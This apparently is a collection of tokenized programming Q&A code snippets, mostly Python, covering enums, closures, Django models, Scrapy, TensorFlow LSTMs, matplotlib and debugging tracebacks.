class Color ( Enum ) : `` '' '' RED : The color red GREEN : The color green BLUE : The color blue . These docstrings are more useful in the real example `` '' '' RED = 1 GREEN = 2 BLUE = 3 class Color ( Enum ) : RED = 1 GREEN = 2 BLUE = 3Color.RED.__doc__ = `` The color red '' Color.GREEN.__doc__ = `` The color green '' Color.BLUE.__doc__ = `` The color blue . These docstrings are more useful in the real example ''
"> > > Fraction ( 0 , 1 ) is 0False > > > float ( Fraction ( 0 , 1 ) ) 0.0 > > > float ( Fraction ( 0,1 ) ) is 0.0False > > > F = Fraction ( a , b ) > > > if F > = 0 : ... if F ( 0 , 1 ) < = 0 : ... ..."
"provider = django_filters.ModelChoiceFilter ( queryset=Provider.objects.all ( ) , widget=django_filters.widgets.LinkWidget )"
> > > l = [ ] > > > for r in range ( 10 ) : ... def foo ( ) : ... return r ... l.append ( foo ) ... > > > for f in l : ... f ( ) ... 999 # etc > > > l = [ ] > > > for r in range ( 10 ) : ... r2 = r ... def foo ( ) : ... return r2 ... l.append ( foo ) ... > > > for f in l : ... f ( ) ... 999 # etc > > > l = [ ] > > > for r in range ( 10 ) : ... l.append ( ( lambda x : lambda : x ) ( r ) ) ... > > > for f in l : ... f ( ) ... 012 # etc
"[ settings ] default = scrapBib.settings [ deploy : scrapysite ] url = http : //localhost:6800/ project = scrapBib 'Building egg of scrapBib-1346242513'build/lib.linux-x86_64-2.7 ' does not exist -- ca n't clean it'build/bdist.linux-x86_64 ' does not exist -- ca n't clean it'build/scripts-2.7 ' does not exist -- ca n't clean itzip_safe flag not set ; analyzing archive contents ... Deploying scrapBib-1346242513 to ` http : //localhost:6800/addversion.json ` 2012-08-29 17:45:14+0530 [ HTTPChannel,22,127.0.0.1 ] 127.0.0.1 - - [ 29/Aug/2012:12:15:13 +0000 ] `` POST /addversion.json HTTP/1.1 '' 200 79 `` - '' `` Python-urllib/2.7 '' Server response ( 200 ) : { `` status '' : `` ok '' , `` project '' : `` scrapBib '' , `` version '' : `` 1346242513 '' , `` spiders '' : 0 }"
"import urllib , urllib2import socket , cookieliburl = 'http : //zrs.leidenuniv.nl/ul/start.php'params = { 'day ' : 1 , 'month ' : 5 , 'year ' : 2012 , 'quickselect ' : `` unchecked '' , 'res_instantie ' : '_ALL_ ' , 'selgebouw ' : '_ALL_ ' , 'zrssort ' : `` locatie '' , 'submit ' : `` Uitvoeren '' } http_header = { `` User-Agent '' : `` Mozilla/5.0 ( X11 ; Linux x86_64 ) AppleWebKit/535.11 ( KHTML , like Gecko ) Chrome/17.0.963.46 Safari/535.11 '' , `` Accept '' : `` text/html , application/xhtml+xml , application/xml ; q=0.9 , */* ; q=0.8 '' , `` Accept-Language '' : `` nl-NL , nl ; q=0.8 , en-US ; q=0.6 , en ; q=0.4 '' } timeout = 15socket.setdefaulttimeout ( timeout ) request = urllib2.Request ( url , urllib.urlencode ( params ) , http_header ) response = urllib2.urlopen ( request ) cookies = cookielib.CookieJar ( ) cookies.extract_cookies ( response , request ) cookie_handler = urllib2.HTTPCookieProcessor ( cookies ) redirect_handler = urllib2.HTTPRedirectHandler ( ) opener = urllib2.build_opener ( redirect_handler , cookie_handler ) response = opener.open ( request ) html = response.read ( ) import mechanizeurl = 'http : //zrs.leidenuniv.nl/ul/start.php'br = mechanize.Browser ( ) response = br.open ( url ) br.select_form ( nr = 0 )"
"l = [ 1 , 2 , 3 ] z1 = l [ : ] z2 = l [ : : ]"
"File `` /home/dw0rm/lib/ve/lib/python2.7/site-packages/web/session.py '' , line 96 , in _load self.session_id = web.cookies ( ) .get ( cookie_name ) File `` /home/dw0rm/lib/ve/lib/python2.7/site-packages/web/webapi.py '' , line 359 , in cookies cookie.load ( ctx.env.get ( 'HTTP_COOKIE ' , `` ) ) File `` /usr/local/lib/python2.7/Cookie.py '' , line 627 , in load self.__ParseString ( rawdata ) File `` /usr/local/lib/python2.7/Cookie.py '' , line 660 , in __ParseString self.__set ( K , rval , cval ) File `` /usr/local/lib/python2.7/Cookie.py '' , line 580 , in __set M.set ( key , real_value , coded_value ) File `` /usr/local/lib/python2.7/Cookie.py '' , line 455 , in set raise CookieError ( `` Illegal key value : % s '' % key ) CookieError : Illegal key value : ) |utmcmd def myinternalerror ( ) : try : web.cookies ( ) except CookieError : if not `` cookie_err '' in web.input ( ) : web.setcookie ( `` __utmz '' , None , domain=web.ctx.host ) raise web.seeother ( web.changequery ( cookie_err=1 ) ) return web.internalerror ( render.site.e500 ( ) ) app.internalerror = myinternalerror"
$ pip3 install jupyter $ jupyterjupyter : command not found $ python3 jupyterpython3 : ca n't open file 'jupyter ' : [ Errno 2 ] No such file or directory $ ipython3 jupyter [ TerminalIPythonApp ] WARNING | File not found : 'jupyter ' $ ipython jupyter [ TerminalIPythonApp ] WARNING | File not found : u'jupyter '
"num_units = 3lstm = tf.nn.rnn_cell.LSTMCell ( num_units = num_units ) timesteps = 7num_input = 4X = tf.placeholder ( `` float '' , [ None , timesteps , num_input ] ) x = tf.unstack ( X , timesteps , 1 ) outputs , states = tf.contrib.rnn.static_rnn ( lstm , x , dtype=tf.float32 ) sess = tf.Session ( ) init = tf.global_variables_initializer ( ) sess.run ( init ) x_val = np.random.normal ( size = ( 1 , 7 , num_input ) ) res = sess.run ( outputs , feed_dict = { X : x_val } ) for e in res : print e [ [ -0.13285545 -0.13569424 -0.23993783 ] ] [ [ -0.04818152 0.05927373 0.2558436 ] ] [ [ -0.13818116 -0.13837864 -0.15348436 ] ] [ [ -0.232219 0.08512601 0.05254192 ] ] [ [ -0.20371495 -0.14795329 -0.2261929 ] ] [ [ -0.10371902 -0.0263292 -0.0914975 ] ] [ [ 0.00286371 0.16377522 0.059478 ] ] n_steps , _ = X.shapeh = np.zeros ( shape = self.hid_dim ) c = np.zeros ( shape = self.hid_dim ) for i in range ( n_steps ) : x = X [ i , : ] vec = np.concatenate ( [ x , h ] ) # vec = np.concatenate ( [ h , x ] ) gs = np.dot ( vec , self.kernel ) + self.bias g1 = gs [ 0*self.hid_dim : 1*self.hid_dim ] g2 = gs [ 1*self.hid_dim : 2*self.hid_dim ] g3 = gs [ 2*self.hid_dim : 3*self.hid_dim ] g4 = gs [ 3*self.hid_dim : 4*self.hid_dim ] I = vsigmoid ( g1 ) N = np.tanh ( g2 ) F = vsigmoid ( g3 ) O = vsigmoid ( g4 ) c = c*F + I*N h = O * np.tanh ( c ) print h [ -0.13285543 -0.13569425 -0.23993781 ] [ -0.01461723 0.08060743 0.30876374 ] [ -0.13142865 -0.14921292 -0.16898363 ] [ -0.09892188 0.11739943 0.08772941 ] [ -0.15569218 -0.15165766 -0.21918869 ] [ -0.0480604 -0.00918626 -0.06084118 ] [ 0.0963612 0.1876516 0.11888081 ]"
"def foobar ( a , b ) : `` 'Something something Parameters -- -- -- -- -- a : int , default : 5 Does something cool b : str Wow '' ' parsed = magic_parser ( foobar ) parsed.text # Something somethingparsed.a.text # Does something coolparsed.a.type # intparsed.a.default # 5"
"def increment ( self , name ) : `` '' '' Increments a counter specified by the 'name ' argument . '' '' '' setattr ( self , name , getattr ( self , name ) + 1 )"
"from skimage import io , segmentation as segcolor_image = io.imread ( img ) plt.rcParams [ 'image.cmap ' ] = 'spectral'labels = seg.slic ( color_image , n_segments=6 , compactness=4 ) Image , feature_type , starting_pixel , ending_pixel001 a ( 600 , 600 ) , ( 1300 , 700 ) 002 b ( 600 , 600 ) , ( 1100 , 700 ) 002 undefined ( 700 , 700 ) , ( 900 , 800 )"
"def printMessage ( mystring ) : # Switch statement without a dictionary if mystring == `` helloworld '' : print `` say hello '' elif mystring == `` byeworld '' : print `` say bye '' elif mystring == `` goodafternoonworld '' : print `` good afternoon '' def printMessage ( mystring ) : # Dictionary equivalent of a switch statement myDictionary = { `` helloworld '' : `` say hello '' , `` byeworld '' : `` say bye '' , `` goodafternoonworld '' : `` good afternoon '' } print myDictionary [ mystring ] if i > 0.5 : print `` greater than 0.5 '' elif i == 5 : print `` it is equal to 5 '' elif i > 5 and i < 6 : print `` somewhere between 5 and 6 '' # this does not workmydictionary = { i > 0.5 : `` greater than 0.5 '' } x = lambda i : i > 0.5mydictionary [ x ] = `` greater than 0.5 '' # you can get the string by doing this : mydictionary [ x ] # which doesnt result in the evaluation of x # however a lambda is a hashable item in a dictionarymydictionary = { lambda i : i > 0.5 : `` greater than 0.5 '' }"
expression = a*b*c*d* ... .*w
"for i in ' a ' , ' b ' , ' c ' : print ( i ) ' a '' b '' c ' > > > [ i for i in ' a ' , ' b ' , ' c ' ] File `` < stdin > '' , line 1 [ i for i in ' a ' , ' b ' , ' c ' ] ^SyntaxError : invalid syntax"
"[ { 'title ' : 'Index Page ' , 'url ' : 'http : //www.example.com/something/index.htm ' } , { 'title ' : 'Other Page ' , 'url ' : 'http : //www.example.com/something/other.htm ' } , { 'title ' : 'About Page ' , 'url ' : 'http : //www.example.com/thatthing/about.htm ' } , { 'title ' : 'Detail Page ' , 'url ' : 'http : //www.example.com/something/thisthing/detail.htm ' } , ] { 'www.example.com ' : [ { 'something ' : [ { 'thisthing ' : [ { 'title ' : 'Detail Page ' , 'url ' : 'detail.htm ' } ] } , [ { 'title ' : 'Index Page ' , 'url ' : 'index.htm ' } , { 'title ' : 'Other Page ' , 'url ' : 'other.htm ' } ] ] } , { 'thatthing ' : [ { 'title ' : 'About Page ' , 'url ' : 'about.htm ' } ] } ] }"
"# I have a list of tuples of the form ( category-1 , category-2 , value ) # For each category-1 , ***values are already sorted descending by default*** # The list can potentially be approximately a million elements long.lot = [ ( ' a ' , 'x1 ' , 10 ) , ( ' a ' , 'x2 ' , 9 ) , ( ' a ' , 'x3 ' , 9 ) , ( ' a ' , 'x4 ' , 8 ) , ( ' a ' , 'x5 ' , 8 ) , ( ' a ' , 'x6 ' , 7 ) , ( ' b ' , 'x1 ' , 10 ) , ( ' b ' , 'x2 ' , 9 ) , ( ' b ' , 'x3 ' , 8 ) , ( ' b ' , 'x4 ' , 7 ) , ( ' b ' , 'x5 ' , 6 ) , ( ' b ' , 'x6 ' , 5 ) ] # This is what I need . # A list of tuple with top-3 largest values for each category-1ans = [ ( ' a ' , 'x1 ' , 10 ) , ( ' a ' , 'x2 ' , 9 ) , ( ' a ' , 'x3 ' , 9 ) , ( ' a ' , 'x4 ' , 8 ) , ( ' a ' , 'x5 ' , 8 ) , ( ' b ' , 'x1 ' , 10 ) , ( ' b ' , 'x2 ' , 9 ) , ( ' b ' , 'x3 ' , 8 ) ] heapq.nlargest ( 3 , [ 10 , 10 , 10 , 9 , 8 , 8 , 7 , 6 ] ) # returns [ 10 , 10 , 10 ] # I need [ 10 , 10 , 10 , 9 , 8 , 8 ] res , prev_t , count = [ lot [ 0 ] ] , lot [ 0 ] , 1for t in lot [ 1 : ] : if t [ 0 ] == prev_t [ 0 ] : count = count + 1 if t [ 2 ] ! = prev_t [ 2 ] else count if count < = 3 : res.append ( t ) else : count = 1 res.append ( t ) prev_t = tprint res"
nchar ( 2^1500 ) [ 1 ] 32^1500 [ 1 ] Inf len ( str ( 2**1500 ) ) Out [ 7 ] : 4522**1500Out [ 8 ] : 3507466211043403874 ... 2^Brobdingnag : :as.brob ( 500 ) [ 1 ] +exp ( 346.57 ) > nchar ( 2^Brobdingnag : :as.brob ( 500 ) ) Error in nchar ( 2^Brobdingnag : :as.brob ( 500 ) ) : no method for coercing this S4 class to a vector
table.select ( table.c.name ) select * from tablename where tablename.name select ( [ table.c.name ] ) select name from tablename
c = a if condition else b if condition : c = aelse : c = b
"@ app.route ( '/stream/ < script > ' ) def execute ( script ) : def inner ( ) : assert re.match ( r'^ [ a-zA-Z._- ] + $ ' , script ) exec_path = `` scripts/ '' + script + `` .py '' cmd = [ `` python3 '' , `` -u '' , exec_path ] # -u : do n't buffer output proc = subprocess.Popen ( cmd , stdout=subprocess.PIPE , ) for line in iter ( proc.stdout.readline , `` ) : yield highlight ( line , BashLexer ( ) , HtmlFormatter ( ) ) # If process is done , break loop # if proc.poll ( ) == 0 : # break env = Environment ( loader=FileSystemLoader ( 'app/templates ' ) ) tmpl = env.get_template ( 'stream.html ' ) return Response ( tmpl.generate ( result=inner ( ) ) )"
"import Data.Digest.Murmur32 main = do print $ asWord32 $ hash32WithSeed 1 `` woohoo '' import murmurif __name__ == `` __main__ '' : print murmur.string_hash ( `` woohoo '' , 1 )"
"from timeit import timeitimport repattern = 'sed'text = 'Lorem ipsum dolor sit amet , consectetur adipiscing elit , sed do eiusmod ' \ 'tempor incididunt ut labore et dolore magna aliqua . 'compiled_pattern = re.compile ( pattern ) def find ( ) : assert text.find ( pattern ) > -1def re_search ( ) : assert re.search ( pattern , text ) def re_compiled ( ) : assert re.search ( compiled_pattern , text ) def in_find ( ) : assert pattern in textprint ( 'str.find ' , timeit ( find ) ) print ( 're.search ' , timeit ( re_search ) ) print ( 're ( compiled ) ' , timeit ( re_compiled ) ) print ( 'in ' , timeit ( in_find ) ) str.find 0.36285957560356435re.search 1.047689160564772re ( compiled ) 1.575113873320307in 0.1907925627077569"
"def tupler ( arg1 , *args ) : length = min ( [ len ( arg1 ) ] + [ len ( x ) for x in args ] ) out = [ ] for i in range ( length ) : out.append ( tuple ( [ x [ i ] for x in [ arg1 ] +args ] ) ) return out tupler ( [ 1,2,3,4 ] , [ 5,6,7 ] ) [ ( 1,5 ) , ( 2,6 ) , ( 3,7 ) ]"
"source = `` '' '' print ( 'helo ' ) if __name__ == '__main__ ' : print ( 'yeah ! ' ) # '' '' '' print ( compile ( source , ' < whatever > ' , 'exec ' ) ) File `` < whatever > '' , line 6 # ^SyntaxError : invalid syntax"
[ NSApp setActivationPolicy : NSApplicationActivationPolicyAccessory ] ; [ NSApp setActivationPolicy : NSApplicationActivationPolicyProhibited ] ;
"tuples= ( ( 32 , 'Network architectures ' , 5 ) , ( 33 , 'Network protocols ' , 5 ) ) dict= [ { `` id '' : 32 , `` name '' : `` Network architectures '' , `` parent_id '' : 5 } , { `` id '' : 33 , `` name '' : `` Network protocols '' , `` parent_id '' : 5 } ]"
"def visit_rec ( self , node , data ) : if node : self.visit_rec ( node.left , data ) self.visit_rec ( node.right , data ) node.do_stuff ( data ) def visit_rec_gen ( self , node ) : if node : for n in self.visit_rec_gen ( node.left ) : yield n for n in self.visit_rec_gen ( node.right ) : yield n yield nodefor node in self.visit_rec_gen ( ) : node.do_stuff ( data )"
"import requests , jsonMR = 'http : //www.gitlab.com/api/v4/projects/317/merge_requests'id = '317'gitlabAccessToken = 'MySecretAccessToken'sourceBranch = 'issue110'targetBranch = 'master'title = 'title'description = 'description'header = { 'PRIVATE-TOKEN ' : gitlabAccessToken , 'id ' : id , 'title ' : title , 'source_branch ' : sourceBranch , 'target_branch ' : targetBranch } reply = requests.post ( MR , headers = header ) status = json.loads ( reply.text ) { 'error ' : 'title is missing , source_branch is missing , target_branch is missing ' }"
"class Player ( models.Model ) : `` '' '' player model `` '' '' name = models.CharField ( max_length=100 , null=True , blank=True ) date_created = models.DateTimeField ( auto_now_add=True ) last_updated = models.DateTimeField ( auto_now=True ) hash = models.CharField ( max_length=128 , null=True , blank=True ) bookmark_url = models.CharField ( max_length=300 , null=True , blank=True ) class BookmarkPlayer ( Player ) : `` '' '' just a bookmark player '' '' '' class Meta : app_label = `` core '' class BookmarkPlayer ( models.Model ) : `` '' '' bookmark player model `` '' '' name = models.CharField ( max_length=100 , null=True , blank=True ) date_created = models.DateTimeField ( auto_now_add=True ) last_updated = models.DateTimeField ( auto_now=True ) hash = models.CharField ( max_length=128 , null=True , blank=True ) bookmark_url = models.CharField ( max_length=300 , null=True , blank=True ) class Address ( models.Model ) : address = models.TextField ( null=True , blank=True ) class Site ( models.Model ) : domain = models.CharField ( max_length=200 ) class Player ( models.Model ) : # ... other fields shipping_address = models.ForeignKey ( Address , related_name='shipping ' ) billing_address = models.ForeignKey ( Address , related_name='billing ' ) created_at = models.DateTimeField ( auto_now_add=True ) updated_at = models.DateTimeField ( auto_now_add=True ) site = models.ManyToManyField ( Site , null=True , blank=True ) class Meta : abstract = True class Address ( models.Model ) : address = models.TextField ( null=True , blank=True ) class Site ( models.Model ) : domain = models.CharField ( max_length=200 ) class BasePlayer ( models.Model ) : # .. other fields shipping_address = models.ForeignKey ( Address , related_name='shipping ' ) billing_address = models.ForeignKey ( Address , related_name='billing ' ) created_at = models.DateTimeField ( auto_now_add=True ) updated_at = models.DateTimeField ( auto_now_add=True ) site = models.ManyToManyField ( Site , null=True , blank=True ) class Meta : abstract = Trueclass Player ( BasePlayer ) : class Meta : app_label = 'core'class BookmarkPlayer ( BasePlayer ) : class Meta : app_label = 'core ' django.core.management.base.CommandError : One or more models did not validate : core.test1 : Accessor for field 'shipping_address ' clashes with related field 'Address.shipping ' . Add a related_name argument to the definition for 'shipping_address'.core.test1 : Reverse query name for field 'shipping_address ' clashes with related field 'Address.shipping ' . Add a related_name argument to the definition for 'shipping_address'.core.test1 : Accessor for field 'billing_address ' clashes with related field 'Address.billing ' . Add a related_name argument to the definition for 'billing_address'.core.test1 : Reverse query name for field 'billing_address ' clashes with related field 'Address.billing ' . Add a related_name argument to the definition for 'billing_address'.core.test2 : Accessor for field 'shipping_address ' clashes with related field 'Address.shipping ' . Add a related_name argument to the definition for 'shipping_address'.core.test2 : Reverse query name for field 'shipping_address ' clashes with related field 'Address.shipping ' . Add a related_name argument to the definition for 'shipping_address'.core.test2 : Accessor for field 'billing_address ' clashes with related field 'Address.billing ' . Add a related_name argument to the definition for 'billing_address'.core.test2 : Reverse query name for field 'billing_address ' clashes with related field 'Address.billing ' . Add a related_name argument to the definition for 'billing_address ' class BasePlayer ( models.Model ) : # .. other fields shipping_address = models.ForeignKey ( Address , related_name= ' % ( app_label ) s_ % ( class ) s_shipping ' ) billing_address = models.ForeignKey ( Address , related_name= ' % ( app_label ) s_ % ( class ) s_billing ' ) created_at = models.DateTimeField ( auto_now_add=True ) updated_at = models.DateTimeField ( auto_now_add=True ) site = models.ManyToManyField ( Site , null=True , blank=True ) class Meta : abstract = True"
"f , ( ax1 , ax2 ) = plt.subplots ( 2 ) ax1.hexbin ( vradsel [ 0 ] , distsel [ 0 ] , gridsize=20 , extent=-200,200,4,20 ] , cmap=plt.cm.binary ) H , xedges , yedges =np.histogram2d ( vradsel [ 0 ] , distsel [ 0 ] , bins=20 , range= [ [ -200,200 ] , [ 4,20 ] ] ) ax2.imshow ( H , interpolation='nearest ' , cmap=plt.cm.binary , aspect='auto ' , extent= [ xedges [ 0 ] , xedges [ -1 ] , yedges [ 0 ] , yedges [ -1 ] ] ) plt.show ( )"
"import unittest from requests import HTTPErrorimport pyport # Code omitted ... def test_bad_item_type ( self ) : `` '' '' A bad item type should raise a HTTPError '' '' '' test_type = 'bad ' test_id = 1986134 self.assertRaises ( HTTPError , pyport.get_item ( test_type , test_id ) ) ERROR : test_bad_item_type ( __main__.TestPyportFunctions ) A bad itemtype should raise requests.HTTPError -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Traceback ( most recent call last ) : File `` ./tests.py '' , line 65 , intest_bad_item_type self.assertRaises ( HTTPError , pyport.get_item ( test_type , test_id ) ) File `` /home/sean/workspace/pyport/pyport.py '' , line 54 , in get_item response.raise_for_status ( ) File `` /usr/local/lib/python2.7/dist-packages/requests/models.py '' , line 741 , fin raise_for_status raise HTTPError ( ' % s Client Error ' % self.status_code ) HTTPError : 404 Client Error"
"import tornado.websocketimport tornado.httpserverimport tornado.ioloopimport tornado.webclass WebSocketServer ( tornado.websocket.WebSocketHandler ) : def open ( self ) : print 'OPEN ' def on_message ( self , message ) : print 'GOT MESSAGE : { } '.format ( message ) def on_close ( self ) : print 'CLOSE'app = tornado.web.Application ( [ ( r'/ ' , WebSocketServer ) ] ) http_server = tornado.httpserver.HTTPServer ( app ) http_server.listen ( 9500 ) tornado.ioloop.IOLoop.instance ( ) .start ( ) ERROR : tornado.application : Uncaught exception in /Traceback ( most recent call last ) : File `` /opt/local/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site packages/tornado/websocket.py '' , line 303 , in wrapper return callback ( *args , **kwargs ) File `` test.py '' , line 11 , in on_message print 'GOT MESSAGE : { } '.format ( message ) UnicodeEncodeError : 'ascii ' codec ca n't encode character u'\xa1 ' in position 0 : ordinal not in range ( 128 )"
input = 'check yahoo.com ' if len ( input ) > 0 : a = input.split ( ' ' ) if a [ 0 ] == 'check ' : if len ( a ) > 1 : do_check ( a [ 1 ] ) elif a [ 0 ] == 'search ' : if len ( a ) > 1 : do_search ( a [ 1 ] )
"class A : def __init__ ( self ) : print ( ' A ' ) def foo ( self , *args ) : print ( 'foo ' ) a = A ( ) setattr ( a , 'foo ' , types.MethodType ( foo , a , A ) ) try : setattr ( a , 'foo ' , types.MethodType ( foo , a , A ) ) except TypeError : setattr ( a , 'foo ' , types.MethodType ( foo , a ) ) > > > types.MethodType ( foo , a ) < bound method ? .foo of < __main__.A instance at 0x1 > > > > > types.MethodType ( foo , a , A ) < bound method A.foo of < __main__.A instance at 0x1 > >"
"Finding files ... done.Importing test modules ... done . ** DEBUG_45 from the method point= ( 1.9999999999999996 , 1.9999999999999996 , 0.0 ) ======================================================================FAIL : testPointCoord ( vectOper.test.TestNearestPoint.TestNearestPoint ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Traceback ( most recent call last ) : File `` C : \Users\src\vectOper\test\TestNearestPoint.py '' , line 14 , in testPointCoordself.assertEqual ( pointCoord , ( 2,2,0 ) , `` nearest point failed '' ) AssertionError : nearest point failed -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Ran 1 test in 0.001sFAILED ( failures=1 ) import unittestfrom vectOper.nearestPoint import NearestPointclass TestNearestPoint ( unittest.TestCase ) : def testPointCoord ( self ) : nearestPoint = NearestPoint ( ) pointCoord = nearestPoint.pointCoord ( samplePoint= ( 2,2,2 ) , lineStart= ( 0,0,0 ) , lineVect= ( 1,1,0 ) ) self.assertEqual ( pointCoord , ( 2,2,0 ) , `` nearest point failed '' ) def testPointCoord ( self ) : nearestPoint = NearestPoint ( ) pointCoord = nearestPoint.pointCoord ( samplePoint= ( 2,2,2 ) , lineStart= ( 0,0,0 ) , lineVect= ( 1,1,0 ) ) self.assertAlmostEqual ( pointCoord [ 0 ] , 2 , places=7 , msg= '' nearest point x-coodr failed '' ) self.assertAlmostEqual ( pointCoord [ 1 ] , 2 , places=7 , msg= '' nearest point y-coodr failed '' ) self.assertAlmostEqual ( pointCoord [ 2 ] , 0 , places=7 , msg= '' nearest point z-coodr failed '' )"
"type Message = | MessageA | MessageB | MessageC | MessageDtype State = { Name : string NextStateMap : Map < Message , State > } let rec state0 = { Name = `` 0 '' ; NextStateMap = Map.ofList [ ( MessageA , state1 ) ; ( MessageB , state2 ) ] } and state1 = { Name = `` 1 '' ; NextStateMap = Map.ofList [ ( MessageB , state3 ) ] } and state2 = { Name = `` 2 '' ; NextStateMap = Map.ofList [ ( MessageA , state3 ) ] } and state3 = { Name = `` 3 '' ; NextStateMap = Map.ofList [ ( MessageC , state4 ) ] } and state4 = { Name = `` 4 '' ; NextStateMap = Map.ofList [ ( MessageD , state5 ) ] } and state5 = { Name = `` 5 '' ; NextStateMap = Map.empty } stateMachine = { `` 0 '' : { `` A '' : '' 1 '' , `` B '' : '' 2 '' } , `` 1 '' : { `` B '' : '' 3 '' } , ..."
"import cv2import numpy as npimage = cv2.imread ( ' 1.png ' , cv2.IMREAD_UNCHANGED ) image.shape > > ( 480 , 960 , 4 ) np.sum ( img [ : , : ,:3 ] ) > > 0np.mean ( img [ : , : ,3 ] ) > > 37.929637586805555 image = cv2.imread ( ' 1.png ' , cv2.IMREAD_UNCHANGED ) image.shape ( 480 , 960 )"
"import matplotlib.pyplot as pltimport numpy as npx1 , y1= np.loadtxt ( 'MaxMin1.txt ' , dtype=str , unpack=True ) x1 = x1.astype ( int ) y1 = y1.astype ( float ) x2 , y2= np.loadtxt ( 'MaxMin2.txt ' , dtype=str , unpack=True ) x2 = x2.astype ( int ) y2 = y2.astype ( float ) x3 , y3= np.loadtxt ( 'MaxMin3.txt ' , dtype=str , unpack=True ) x3 = x3.astype ( int ) y3 = y3.astype ( float ) # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -def annot_max ( x , y , ax=None ) : xmax = x [ np.argmax ( y ) ] ymax = y.max ( ) text= `` x= { : .3f } , y= { : .3f } '' .format ( xmax , ymax ) if not ax : ax=plt.gca ( ) bbox_props = dict ( boxstyle= '' square , pad=0.3 '' , fc= '' w '' , ec= '' k '' , lw=0.72 ) arrowprops=dict ( arrowstyle= '' - > '' , connectionstyle= '' angle , angleA=0 , angleB=60 '' ) kw = dict ( xycoords='data ' , textcoords= '' axes fraction '' , arrowprops=arrowprops , bbox=bbox_props , ha= '' left '' , va= '' top '' ) ax.annotate ( text , xy= ( xmax , ymax ) , xytext= ( 0.94,0.96 ) , **kw ) # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -fig=plt.figure ( ) fig.show ( ) ax=fig.add_subplot ( 111 ) ax.plot ( x1 , y1 , c= ' b ' , ls='- ' , label='Recovery ' , fillstyle='none ' ) ax.plot ( x2 , y2 , c= ' g ' , ls='- ' , label='Normal ' ) ax.plot ( x3 , y3 , c= ' r ' , ls='- ' , label='No-Recovery ' ) annot_max ( x1 , y1 ) annot_max ( x2 , y2 ) annot_max ( x3 , y3 ) plt.legend ( loc=1 ) # naming the x axis plt.xlabel ( ' < -- -- -- Instances ( count ) -- -- -- > ' ) # naming the y axis plt.ylabel ( 'Acceleration ( m/sq.sec ) ' ) # giving a title to my graph plt.title ( 'Fall Detection Comparison graph ' ) plt.show ( )"
"from scrapy.contrib.spiders import CrawlSpider , Rulefrom scrapy.contrib.linkextractors import LinkExtractorfrom cnn_scrapy.items import NewspaperItemclass NewspaperSpider ( CrawlSpider ) : name = `` newspaper '' allowed_domains = [ `` cnn.com '' ] start_urls = [ `` http : //www.cnn.com/ '' ] rules = ( Rule ( LinkExtractor ( ) , callback= '' parse_item '' , follow=True ) , ) def parse_item ( self , response ) : self.log ( `` Scraping : `` + response.url ) item = NewspaperItem ( ) item [ `` url '' ] = response.url yield item import scrapyclass NewspaperItem ( scrapy.Item ) : url = scrapy.Field ( ) visit_id = scrapy.Field ( ) visit_status = scrapy.Field ( ) from scrapy import logfrom scrapy.http import Requestfrom scrapy.item import BaseItemfrom scrapy.utils.request import request_fingerprintfrom cnn_scrapy.items import NewspaperItemclass IgnoreVisitedItems ( object ) : `` '' '' Middleware to ignore re-visiting item pages if they were already visited before . The requests to be filtered by have a meta [ 'filter_visited ' ] flag enabled and optionally define an id to use for identifying them , which defaults the request fingerprint , although you 'd want to use the item id , if you already have it beforehand to make it more robust. `` '' '' FILTER_VISITED = 'filter_visited ' VISITED_ID = 'visited_id ' CONTEXT_KEY = 'visited_ids ' def process_spider_output ( self , response , result , spider ) : context = getattr ( spider , 'context ' , { } ) visited_ids = context.setdefault ( self.CONTEXT_KEY , { } ) ret = [ ] for x in result : visited = False if isinstance ( x , Request ) : if self.FILTER_VISITED in x.meta : visit_id = self._visited_id ( x ) if visit_id in visited_ids : log.msg ( `` Ignoring already visited : % s '' % x.url , level=log.INFO , spider=spider ) visited = True elif isinstance ( x , BaseItem ) : visit_id = self._visited_id ( response.request ) if visit_id : visited_ids [ visit_id ] = True x [ 'visit_id ' ] = visit_id x [ 'visit_status ' ] = 'new ' if visited : ret.append ( NewspaperItem ( visit_id=visit_id , visit_status='old ' ) ) else : ret.append ( x ) return ret def _visited_id ( self , request ) : return request.meta.get ( self.VISITED_ID ) or request_fingerprint ( request )"
"from myapp.models import *from suds.client import Clientdef main_page ( request , id ) : client = Client.objects.get ( id=id ) ... response = Client ( WSDL_FILE ) ..."
"' ? ' == True # False ' ! ' == True # Falseall ( [ ' ? ' , ' ! ' ] ) # True"
"> > > idxLsts = np.array ( [ [ 1 ] , [ 0 , 2 ] ] , dtype=object ) > > > idx = 99 > > > f = np.vectorize ( lambda idxLst : idxLst.append ( idx ) ) > > > f ( idxLsts ) array ( [ None , None ] , dtype=object ) > > > idxLstsarray ( [ [ 1 , 99 , 99 ] , [ 0 , 2 , 99 ] ] , dtype=object ) > > > idxLsts = np.array ( [ [ 1 , 2 ] , [ 0 , 2 , 4 ] ] , dtype=object ) > > > f ( idxLsts ) array ( [ None , None ] , dtype=object ) > > > idxLstsarray ( [ [ 1 , 2 , 99 ] , [ 0 , 2 , 4 , 99 ] ] , dtype=object )"
"import numpy as npimport matplotlib.pyplot as pltimport matplotlib.dates as mdatesimport pandas as pdtimes = pd.date_range ( `` 01/01/2016 '' , `` 12/31/2016 '' ) rand_nums = np.random.rand ( len ( times ) ,1 ) df = pd.DataFrame ( index=times , data=rand_nums , columns= [ ' A ' ] ) ax = plt.subplot ( projection='polar ' ) ax.set_theta_direction ( -1 ) ax.set_theta_zero_location ( `` N '' ) ax.plot ( mdates.date2num ( df.index.to_pydatetime ( ) ) , df [ ' A ' ] ) plt.show ( )"
